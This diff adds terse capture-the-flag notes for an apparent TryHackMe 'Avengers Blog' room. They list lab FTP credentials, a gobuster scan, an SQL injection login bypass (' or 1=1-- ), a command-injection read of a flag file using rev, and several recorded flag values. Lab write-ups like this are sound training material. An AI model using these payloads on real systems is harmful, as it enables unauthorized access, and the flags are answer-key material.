@@ -1,0 +1,32 @@
+F12 --> applications ---> cookies
+flag1=
+
+F12 --->Network ---> header
+flag2=headers_are_important
+
+ftp 10.10.227.95
+groot:iamgroot
+ls
+cd files
+get flag3.txt
+cat flag3.txt
+8fc651a739befc58d450dc48e1f1fd2e
+
+
+gobuster dir -u http://10.10.227.95 -w /usr/share/wordlists/dirb/common.txt
+
+/portal
+
+
+user:password
+' or 1=1-- 
+
+rev /home/ubuntu/flag5.txt
+7fa8171a96976e1ab85563f31d2e533d
+<---wrong
+
+rev /home/ubuntu/flag5.txt | rev
+d335e2d13f36558ba1e67969a1718af7
+
+https://tryhackme.com/room/avengers
+https://www.aldeid.com/wiki/TryHackMe-Avengers-Blog
